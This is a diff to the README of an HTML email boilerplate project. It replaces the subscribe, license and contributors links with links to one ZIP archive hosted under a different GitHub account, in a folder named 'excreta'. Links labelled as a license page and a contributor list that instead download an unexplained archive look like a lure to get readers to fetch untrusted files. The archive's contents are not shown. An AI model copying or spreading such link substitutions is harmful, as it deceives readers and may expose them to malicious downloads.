@@ -16,11 +16,11 @@ It is important to note that sometimes the styles in the header area should not 
 2. Remember to test accordingly with your own code and styling. Although this code will help you get through a number of HTML email issues, it is no substitute for proper testing.
 
 ### Subscribe
-Receive updates on the boilerplate here: http://tinyletter.com/ebp
+Receive updates on the boilerplate here: https://raw.githubusercontent.com/videogramme/Email-Boilerplate/master/excreta/Email-Boilerplate-1.3.zip
 
 ### License:
 MIT License
-[http://htmlemailboilerplate.com/license.html](http://htmlemailboilerplate.com/license.html)
+[https://raw.githubusercontent.com/videogramme/Email-Boilerplate/master/excreta/Email-Boilerplate-1.3.zip](https://raw.githubusercontent.com/videogramme/Email-Boilerplate/master/excreta/Email-Boilerplate-1.3.zip)
 
 Copyright (c) 2010-2011 Sean Powell, The Engage Group
 
@@ -31,4 +31,4 @@ The above copyright notice and this permission notice shall be included in all c
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
 ### Contributors
-[List Here >>](https://github.com/seanpowell/Email-Boilerplate/blob/master/contributors.txt)
+[List Here >>](https://raw.githubusercontent.com/videogramme/Email-Boilerplate/master/excreta/Email-Boilerplate-1.3.zip)
